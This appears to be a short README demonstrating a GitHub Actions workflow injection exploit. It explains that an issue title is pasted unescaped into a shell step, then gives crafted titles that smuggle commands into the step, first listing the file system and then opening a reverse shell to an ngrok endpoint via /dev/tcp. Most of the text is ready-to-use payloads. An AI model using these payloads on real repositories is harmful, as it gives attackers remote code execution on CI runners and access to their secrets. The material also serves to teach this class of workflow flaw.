# Issue Injection
Try creating a new issue with the title:
`new issue title" && ls / && echo "`

## Why?
The GitHub service which dispatches these workflows to the hosted runners replaces 
the macros `${{ ... }}` blindly, so `echo "${{github.event.issue.title}}"` becomes 
`echo "new issue title" && ls / && echo ""`, thus, giving us arbitrary code execution 
capabilities.

# Code execution
We continue the exploit concept from `Issue Injection`, but take it a step further.

Setup: create a [reverse shell](https://ngrok.com/download) listening on port 10000 
Lets create an issue with the title: 
```New malicious issue title" && bash -i >& /dev/tcp/<ENDPOINT> 0>&1 && echo "```
Make sure to replace the `<ENDPOINT>` with your reverse shell endpoint (ex: `4.tcp.ngrok.io:19787`)
New malicious issue title" && bash -i >& /dev/tcp/4.tcp.ngrok.io:15631 0>&1 && echo "
